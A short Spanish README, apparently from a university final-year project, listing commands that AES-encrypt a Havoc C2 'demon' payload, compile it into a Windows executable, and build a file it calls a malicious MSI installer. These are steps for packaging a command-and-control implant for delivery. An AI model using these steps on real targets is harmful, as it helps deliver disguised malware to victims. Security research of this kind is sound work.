# Recursos del trabajo de fin de grado
## Comandos para compilar el malware de Havoc
```
python3 aes.py demon.bin
x86_64-w64-mingw32-windres recursos.rc -o recursos.o
x86_64-w64-mingw32-g++ -o atx.exe havoc.cpp recursos.o --static
```
## Comandos para compilar el archivo MSI malicioso
```
wix convert plantilla.wxs
wix build -o setup.msi setup.wxs
```
